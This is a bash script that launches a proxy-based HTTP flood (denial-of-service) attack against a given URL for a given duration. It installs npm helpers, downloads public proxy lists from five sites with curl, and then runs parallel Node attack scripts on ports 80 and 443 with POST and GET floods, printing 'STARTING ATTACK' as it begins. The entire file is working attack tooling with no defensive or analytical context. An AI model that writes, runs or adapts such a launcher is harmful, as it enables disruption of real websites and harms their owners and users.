#!/bin/bash

[ $# -lt 2 ] && { echo "Usage: $0 {URL} {TIME}"; exit 1; }

URL=$1
TIME=$2

# Check & install required npm modules
echo "----------- CHECKING REQUIRED MODULES -----------"
for pkg in randomstring hpack; do
    node -e "require('$pkg')" 2>/dev/null && echo "$pkg: Installed" || { 
        echo "Installing $pkg..."; npm install "$pkg" && echo "$pkg: Installed"; 
    }
done

# Fetch proxies from 5 URLs and save to 1.txt
echo "----------- FETCHING PROXIES -----------"
> 1.txt
for url in \
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=2000&country=all&ssl=all&anonymity=all" \
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=all&protocol=https&proxy_format=ipport&format=text&timeout=2000" \
    "https://proxy.baidunow.icu/http.txt" \
    "https://free.qiucg.com/proxy.txt" \
    "https://xn--mnqu23e2hf.xyz/proxy.txt"; do
    curl -s "$url" >> 1.txt
done

# Count proxies and display result
PROXY_COUNT=$(wc -l < 1.txt)
[ "$PROXY_COUNT" -gt 0 ] && echo "Total proxies fetched: $PROXY_COUNT" || { echo "Error: No proxies found!"; exit 1; }

echo "----------- WAITING 5 SECONDS BEFORE ATTACK -----------"
sleep 5

# Start attack on ports 80 and 443
echo "----------- STARTING ATTACK -----------"
for PORT in 80 443; do 
    echo "→ Running: node ok.js $URL $TIME 10 128 $PORT 1.txt"
    node ok.js "$URL" "$TIME" 10 128 "$PORT" 1.txt & 
done

for METHOD in POST GET; do 
    echo "→ Running: node ok1 $METHOD $URL 1.txt $TIME 128 10 randomstring=true"
    node ok1 "$METHOD" "$URL" 1.txt "$TIME" 128 10 randomstring="true" & 
done

wait
echo "----------- STOPPING ALL PROCESSES -----------"
pkill -f -9 "node ok.js|node ok1"
echo "----------- ATTACK FINISHED -----------"
